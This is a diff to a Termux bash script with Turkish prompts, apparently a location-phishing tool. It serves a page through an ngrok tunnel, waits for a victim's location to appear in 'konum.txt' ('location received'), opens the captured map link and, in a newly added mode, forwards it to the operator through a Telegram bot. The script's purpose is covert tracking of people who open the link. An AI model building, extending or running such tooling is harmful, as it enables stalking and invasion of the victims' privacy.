@@ -44,17 +44,17 @@ fi
 
 if [[ $1 == update ]];then
 	cd files
-	./update.sh update
+	./update.sh update $2
 	exit
 fi
+# COMMANDS SCRİPT CONTROLS #
 
-# BİLDİRİM SCRİPT KONTROLÜ #
-
-if [[ -a files/termuxxtoolssmod ]];then
-	mv files/termuxxtoolssmod $PREFIX/bin
+if [[ -a files/commands/termuxxtoolssmod ]];then
+	mv files/commands/termuxxtoolssmod $PREFIX/bin
+	mv files/commands/link-create $PREFIX/bin
 	chmod 777 $PREFIX/bin/*
 fi
-control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
+control=$(ps aux | grep ngrok | grep -v grep |grep -o http)
 if [[ -n $control ]];then
 	killall ngrok
 	killall php
@@ -62,13 +62,11 @@ fi
 clear
 cd files
 ./update.sh
-bash banner.sh
-cd ..
-if [[ -a updates_infos ]];then
-	rm updates_infos
+if [[ -a ../updates_infos ]];then
+	rm ../updates_infos
 	exit
 fi
-cd files
+bash banner.sh
 #################### BULUNAN KONUM ADRESİ ####################
 bulunan () {
 if [[ -e "eskikonum.txt" ]]; then
@@ -88,7 +86,14 @@ url() {
 	while true;
 	do
 		if [[ -e "konum.txt" ]]; then
-			echo "[✓] KONUM ALINDI" > .info
+			control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+			if [[ $control == telegram-bot ]];then
+				echo "[✓] KONUM ALINDI" > .info
+				termuxxtoolssmod --send
+				cat konum.txt > .info
+			else
+				echo "[✓] KONUM ALINDI" > .info
+			fi
 			termuxxtoolssmod --send
 			link=$(cat konum.txt)
 			xdg-open $link
@@ -136,27 +141,24 @@ echo
 echo
 read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
 if [ $secim == 1 ];then
-	kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
-	if [[ $kontrol == 0 ]];then
-		bash index.sh -bg -p 4444
-		echo
-		echo
-		echo
-		sleep 3
-		printf "\e[33m[*]\e[97m KONUM BULUNDUĞUNDA BİLDİRİM İLE HABER VERİLECEK.."
-		echo
-		echo
-		echo
-		echo
-		sleep 2
-		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
-		echo
-		echo
-		echo
-		url
-		cd ..
-		bash $0
-	fi
+	link-create -p
+	echo
+	echo
+	echo
+	sleep 3
+	printf "\e[33m[*]\e[97m KONUM BULUNDUĞUNDA BİLDİRİM İLE HABER VERİLECEK.."
+	echo
+	echo
+	echo
+	echo
+	sleep 2
+	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
+	echo
+	echo
+	echo
+	url
+	cd ..
+	bash $0
 elif [[ $secim == x || $secim == X ]];then
 	echo
 	echo
